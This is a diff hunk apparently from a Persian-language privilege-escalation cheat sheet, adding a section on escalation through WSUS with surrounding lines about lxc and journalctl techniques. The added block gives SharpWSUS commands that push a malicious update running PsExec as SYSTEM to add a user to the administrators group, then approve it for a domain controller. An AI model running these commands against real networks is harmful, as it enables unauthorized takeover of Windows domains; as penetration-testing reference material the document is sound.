@@ -356,6 +356,15 @@ in victim host
 6. lxc exec tester/bin/sh
 ```
 
+
+
+### افزایش دسترسی با WSUS
+
+```text
+SharpWSUS.exe create /payload:"C:\Users\user\Desktop\PsExec64.exe" /args:"-acceptula -s -d cmd.exe /c \"net localgroup administrator user /add\"" /title:"title"
+SharpWSUS.exe approve /updateid:<id> /computername:dc.domain.dev /groupname:"title"
+
+```
 ### افزایش دسترسی در journalctl 
 
 اجرا کننده journalctl باید با دسترسی بیشتری مانند sudo اجرا شده باشد.
